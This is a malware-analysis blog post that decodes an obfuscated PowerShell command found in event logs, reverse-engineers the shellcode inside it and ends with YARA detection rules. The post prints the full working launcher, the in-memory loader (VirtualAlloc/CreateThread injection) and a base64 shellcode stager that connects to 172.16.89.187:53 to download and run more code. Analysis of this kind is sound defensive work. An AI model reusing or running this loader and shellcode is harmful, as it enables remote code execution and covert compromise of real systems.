---
layout: post
title:  "Memory Attack - Embedded Shellcode Within Powershell"
---



Shell code is a set of assembly instructions that often is used within a malware to preform several tasks on the infected machine. While conducting an analysis of PowerShell operation event logs, I came across an event bearing the eventID "4104" (0x1008) in which an encoded PowerShell command of a dubious nature was executed.

The objective of the shell code is staging where the attacker maintains continued control over a compromised system by installing persistent backdoors to establish foothold, as well as the ability to move laterally over the environment by using remote PowerShell.


---

## Shellcode analysis

The powershell was obfuscated by using base64, and compressed as well. The following shows the powrshell script. 

```
powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAJUtgV0CA7VWa2+bSBT9nEj9D6iyZFAcg1M3zUaKtICxjWtSE2z8WmtFYAwTBnBhiI27/e97x4Y03abddqVFSMzjPs89M5d1HrsUJzH3cWtzn16dnoyc1Ik4vhaEqdTgarj14AgnJ7BR2xN773M3HL+UN5tOEjk4Xl1fq3maopge580eonKWoeieYJTxAvcXNw1Qis4/3D8gl3KfuNqfzR5J7h1SihWq4waIO5djj+0NE9dh4TStDcGUr//xR11YnrdWTe1j7pCMr1tFRlHU9AipC9xngTkcFxvE1w3spkmWrGlziuM3F81JnDlrdAvWHpGBaJB4WV2ANOBNEc3TmDsmxCwc9/k6DEdp4sqel6Isqze4JbO9XK1+55el47s8pjhCTT2mKE02FkofsYuyZt+JPYLu0HoFWhZNceyvBAHEHpMQ8bU4J6TB/YoZ/hZtK9h+Vol/rgRSI5oKDajlS4kaiZcTdFStvxDpgQACPBUJALzPr05fna4rxjxIMn58zhkYnSwPYwQB8qMkwwfBGw6YZIAnhyZpAdPaOM2RsHqCl6tFj1eN76u3KlmQDBPp7QOsLe0EeyvQKYtawz0m+gNudtAax6hTxE6E3Yp+/Es4ozVBhxybldgtBMXXyw3kdRBBvkMZcKzc36hpEaZPukqOiYdS2YVaZRAVlFH4OphjLfi6HhsoAoiOc+BfbQ2kR5V0SfSi8s7mIFRXiZNlDW6Uw6lzG5yFHIK8BifHGS635Jwmh2H9S7hGTih2nYxW5lZCCWPpTk3ijKa5C0WD1MfWBrnYIQyJBtfHHlIKC/uV2/qLOKgOIXASwNIj1AFWWP4WZVRIIUJWdqFpIapHG4IiEDkc/i5xfDjqJd0P1HF85NX/EV9F5iNzGRAVAs+ig+paJKENzsYphSuEgXqg0H/y/uzyYHGoKSrLwFenY6kUlFG6dh+idxYjZInKAYOUQv7dNIkUJ0OX7eM9wb8WNdx5O+okexkerXtn2oo1sRe64Q2IpVNrruHhJAh03NJ9mBcTzR9RafN+PO4PrE5fTju7YC3rma71lcJsKbLbx+/sgTKZgB5Wh+bDTpc9JfJn/lzd6qNgpoMjdejrPnwVPXAVaSH5itRVh5YSaFiSfcvsm+3WQheviIL3lm7J/emTvyc/Wrvdn+3G8q0xkIPuB6/buuge9EOmvwh7w452mLtsbs4zDWvgR+vOTTtAU3ujTLXuwrQ3un+29U17KLa7gQLrOt4NN5YIT6s1eIy9vUGu9gaEa9qLAUYL3UeFL5uybM1jYt1vVUiklSrKIpe6E1gLx3q8M+83hlfM++JvtoHRJpFNTZa7BA5kJDvbjtiaJu9N+6050aRdMZF2W+1B3Gp4sA3L76R3eemL6/ZItC097juBAvEWg3aIB2ewFzm2NF+LNsNPDWNxH8/I5cA4YAr5mKCDGWaOfwd6Rx2ZxvpMFG1f9OU1sXX/yvRnSXzhhGB76ssQIeQItV4PdMOFWAkOJ2czsTWBeKRosJNYrNHgCuxdhC/YtALA1ls4ssLiUKa9RJ6GvUu1uBoZkIfdApuxnY+nfbAJMefhFYMZ6tux1Lhn6bML7/5OEc+8ueMDnmey997fKNhLxZZ5c/OanQM4CLVEfcbu77Umw0mzwCHAemg51UXTTdJu2URGCWYaPM9+P0KUxohA74buXp1XmZDEZU3s2G2ggx77GmuzExi+uXhxJHBPgsKX5lYtXV8vIEq4AQ6HtDlEsU+DhrR7I0nQqaRdW4Ikfz41NdkU/NFWg7U6gObJNjnYFtjVUMv2g+H/ill5HwXw8f4Vsy9rP9j9KRylBsv4m8WvF34J0V9NfOpgCoIW3KYEHZv5d/Iv6fHsh4dVBWq/Lh/2z/ohp+e38B/06vRvUq95ZB8LAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
```



The base64 string is decoded and the picture 1 below

Decoding the base64 string in the powershell script results in a binary file. Analyzing the header of the binary file shows that it’s a compressed file in “.gz” format as the magic number `1F 8B 08` is present in the header refer to Figure 1:

![Figure 1: Decode base64 string to binry file](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled.png)

Figure 1: Decode base64 string to binry file

Decompressing the binary file results in a file “application” with following contents:


```powershell
function qwV {
	Param ($hkr0, $i1ja)		
	$zlVzg = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $zlVzg.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zlVzg.GetMethod('GetModuleHandle')).Invoke($null, @($hkr0)))), $i1ja))
}

function j0Aiv {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $mv8,
		[Parameter(Position = 1)] [Type] $ko05j = [Void]
	)
	
	$iGn = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$iGn.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mv8).SetImplementationFlags('Runtime, Managed')
	$iGn.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ko05j, $mv8).SetImplementationFlags('Runtime, Managed')
	
	return $iGn.CreateType()
}

[Byte[]]$bke7S = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1rBBZu0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$oC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qwV kernel32.dll VirtualAlloc), (j0Aiv @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $bke7S.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bke7S, 0, $oC, $bke7S.length)

$szJL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qwV kernel32.dll CreateThread), (j0Aiv @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oC,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qwV kernel32.dll WaitForSingleObject), (j0Aiv @([IntPtr], [Int32]))).Invoke($szJL,0xffffffff) | Out-Null
```

---
 

The function `qwV` which takes two arguments `$hkr0` and `$i1ja` as module name and name of the module function, respectively, then calls GetModuleHandle and returns the result of `GetProcAddress` to get the address of module function.

The FromBase64String function is called to decode the basce64 string to binary and stored in the Byte array $bke7. The byte array is shown in Figure 2

![Figure 2: Decoded base64 string.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%201.png)

Figure 2: Decoded base64 string.
 
---


The byte array `$bke7S` contains the shellcode. The function `j0Aiv` is used to call the VirtualAlloc function. The size of the shellcode is passed in the second argument of VirtualAlloc as allocation size. 

The thread argument is set to `MEM_COMMIT | MEM_RESERVE` since MEM_COMMIT and `MEM_RESERVE` equates to `0x1000` and `0x2000`, respectively.

The fourth argument which is the memory protection is set to `PAGE_EXECUTE_READWRITE` .

This allocates the memory for the shellcode on the heap. The Copy function is called to copy the shellcode from the byte array $bke7S to the allocated memory.
The CreateThread function is called to execute the shellcode in the allocated memory by creating a new thread. The `WaitForSingleObject` function is called to wait for the thread to complete the execution of the shellcode.
 

---
## Convert powershell to C code

In order to debug the shell code, the powershell script is converted to C code, refer to Figure 3.

 

![Untitled](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%202.png)

  Figure 3: powershell script rewritten in C for code injection

In this example, I injected the code to “notepad” process, which executed the shell code by creating a new thread. In Figure 4, after running the injector, the shellcode is injected into the notepad process, however; it waits for input using `getchar()` function call because this allows to attach the debugger to the notepad and place breakpoint on the entry point and then start the analysis. 


---
![Figure 4: The notepad process created by the injector.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%203.png)

Figure 4: The notepad process created by the injector.

---


## Debugging and reversing engineering the shellcode

![Figure 5: The enterypoint of the shellcode.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%204.png)

Figure 5: The enterypoint of the shellcode.

---

In figure 5, a breakpoint has been placed on the entrypoint of the shell code. by giving any input to the "shell-code-injecter.exe" program, the getchar() function returns the input char, and a new thread will be created. Subsequently, the breakpoint on the entrypoint of the shellcode gets hit.
By stepping into the code, the third instruction `call 1FB977200D6` is called, refer to Figure 6.


![Figure 6: 1FB977200D6 function](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%205.png)

Figure 6: 1FB977200D6 function

---

Stepping through the code again and following the call of instruction `call rbp` jumps the control to function `000001FB9772000A` , refer to Figure 7.

![Figure 7: Function 000001FB9772000A](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%206.png)

Figure 7: Function 000001FB9772000A

Stepping even further down the code shows the function names in the RSI register. The addresses of these functions are being accessed and then called to establish a connection with the malicious server, refer to Figure 8 & 9.

![Figure 8: calling WSAStringToAddressA function](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%207.png)

Figure 8: calling WSAStringToAddressA function

![Figure 9: calling WSASocketW function](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%208.png)

Figure 9: calling WSASocketW function

---

As `WSASocketW` function is called, it is evident that the attacker is trying to either send or receive data from the server. This must mean the function `connect` from `ws2_32.dll` is used to establish the connection. 

This is confirmed by placing a breakpoint on the `connect` function, and the breakpoint gets hit, refer to Figure 10.

![Figure 10: Breakpoint on connect function from ws2_32.dll function gets hit](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%209.png)

Figure 10: Breakpoint on connect function from ws2_32.dll function gets hit

---

### The syntax of connect function looks as follows:

```c
int WSAAPI connect(
  [in] SOCKET         s,
  [in] const sockaddr *name,
  [in] int            namelen
);
```

The server IP can be retrieved from the second argument `name`. In x64, the first argument is passed in `RCX` register, while the second argument is passed in `RDX`. Jumping to the `RDX` value in the debugger dump should reveal the object of the second argument, refer to Figure 11.

![Figure 11: sockaddr_in object in memory](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%2010.png)

Figure 11: sockaddr_in object in memory

---

### The type of object in Figure 11 is `sockaddr_in`.

```c
typedef struct sockaddr_in {
short          sin_family; // 02 00
USHORT         sin_port;  // 00 35 
IN_ADDR        sin_addr;  // AC 10 59 BB
CHAR           sin_zero[8]; // 01 01 02 02 FF 7F BB FF
} SOCKADDR_IN, *PSOCKADDR_IN;
```

The second member `sin_port` is the port and the value is 0x3500, and the third member `sin_addr` is the IP address, and the value is `0xBB5910AC`. Writing a simple program to convert the two values to dotted IP address and the port is demonstrated in Figure 12. The IP is `172.16.89.187` and the port is `53`.

![Figure 12: Port and ip printed](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%2011.png)

Figure 12: Port and ip printed

---

## Static analysis

In Figure 13, the socket connection code is shown and the win32 API functions are labeled. The `WSAStartup` function is called to initiate the Winsock DLL used by the process, then the code enters into a loop, where the `WSASocket` function is called to create the socket. The `WSAStringToAddress` function is called to convert the IP and port to an object. 

The connect function is called to establish a connection with the malicious server. The `VirtualAlloc` function is used to allocate the memory for a new shellcode which will be later downloaded using `recv` function and then executed. After calling `VirtualAlloc`, the memory address is moved into `r15` register, and if the `recv` function succeeds, the `jmp r15` instruction jumps to the newly downloaded shellcode and executes it. The `VirtualFree` function is called to free the shellcode after execution, and the `closesocket` function is called to close the socket.


This code is repeated 10 times because it tries to connect to the server multiple times since there can be failure of connection when calling the `connect` function.

![Figure 13: The Socket connection code.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%2012.png)

Figure 13: The Socket connection code.

---

## Yara rules IOCs

```c
rule application {
   meta:
      description = "shellcoode - file application"
      author = "darksys0x"
      reference = "darksys0x"
      date = "2023-09-14"
      hash1 = "da513bb8d89a42f2cc896357b6c8278db63a9d00f3836396732730ffe82cbb58"
   strings:
      $s1 = "CurrentDomain.GetAssemblies()" ascii
      $s2 = "Split('\\\\')[-1].Equals('System.dll')" ascii
      $s3 = "GetMethod('GetProcAddress" ascii
      $s4 = "Invoke($" ascii
      $s5 = "System.Reflection.AssemblyName(" ascii
      $s6 = "[System.Convert]::FromBase64String" ascii
   condition:
      all of them
}

rule powershell {
   meta:
      description = "shellcoode - file powershell.bin"
      author = "darksys0x"
      reference = "darksys0x"
      date = "2023-09-14"
      hash1 = "3ffcb6e3419dd26033b32b35e6e2709ef429d398de0170a83f2b70edf471f21d"
   strings:
      $x1 = "powershell.exe -nop -w hidden -noni" ascii
      $x2 = "System.Diagnostics.ProcessStartInfo" ascii
      $x3 = "-noni -nop -w hidden -c" ascii
      $x4 = "System.IO.StreamReader" ascii
      $x5 = "System.IO.Compression.GzipStream" ascii
      $x6 = "FromBase64String" ascii
      $x7 = "scriptblock" ascii
      $x8 = "System.IO.Compression.CompressionMode" ascii
      $x9 = "UseShellExecute" ascii
      $x10 = "System.Diagnostics.Process]::Start(" ascii
      $x11 = "WindowStyle='Hidden'" ascii

      $s1 = "NIkUJ0OX7eM9wb8WNdx5O+okexkerXtn2oo1sRe64Q2IpVNrruHhJAh03NJ9mBcTzR9RafN+PO4PrE5fTju7YC3rma71lcJsKbLbx+/sgTKZgB5Wh+bDTpc9JfJn/lzd" ascii
      $s2 = "Vol/rgRSI5oKDajlS4kaiZcTdFStvxDpgQACPBUJALzPr05fna4rxjxIMn58zhkYnSwPYwQB8qMkwwfBGw6YZIAnhyZpAdPaOM2RsHqCl6tFj1eN76u3KlmQDBPp7QOs" ascii
      $s3 = "997fKNhLxZZ5c/OanQM4CLVEfcbu77Umw0mzwCHAemg51UXTTdJu2URGCWYaPM9+P0KUxohA74buXp1XmZDEZU3s2G2ggx77GmuzExi+uXhxJHBPgsKX5lYtXV8vIEq4" ascii
      $s4 = "SfSi8s7mIFRXiZNlDW6Uw6lzG5yFHIK8BifHGS635Jwmh2H9S7hGTih2nYxW5lZCCWPpTk3ijKa5C0WD1MfWBrnYIQyJBtfHHlIKC/uV2/qLOKgOIXASwNIj1AFWWP4W" ascii
      $s5 = "ZVRIIUJWdqFpIapHG4IiEDkc/i5xfDjqJd0P1HF85NX/EV9F5iNzGRAVAs+ig+paJKENzsYphSuEgXqg0H/y/uzyYHGoKSrLwFenY6kUlFG6dh+idxYjZInKAYOUQv7d" ascii
      $s6 = "6qNgpoMjdejrPnwVPXAVaSH5itRVh5YSaFiSfcvsm+3WQheviIL3lm7J/emTvyc/Wrvdn+3G8q0xkIPuB6/buuge9EOmvwh7w452mLtsbs4zDWvgR+vOTTtAU3ujTLXu" ascii
      $s7 = "Le0EeyvQKYtawz0m+gNudtAax6hTxE6E3Yp+/Es4ozVBhxybldgtBMXXyw3kdRBBvkMZcKzc36hpEaZPukqOiYdS2YVaZRAVlFH4OphjLfi6HhsoAoiOc+BfbQ2kR5V0" ascii
      $s8 = "wrQ3un+29U17KLa7gQLrOt4NN5YIT6s1eIy9vUGu9gaEa9qLAUYL3UeFL5uybM1jYt1vVUiklSrKIpe6E1gLx3q8M+83hlfM++JvtoHRJpFNTZa7BA5kJDvbjtiaJu9N" ascii
      $s9 = "H4sIAJUtgV0CA7VWa2+bSBT9nEj9D6iyZFAcg1M3zUaKtICxjWtSE2z8WmtFYAwTBnBhiI27" ascii
   condition:
      4 of ($x*) or 1 of ($s*)
}

/* Super Rules ------------------------------------------------------------- */
```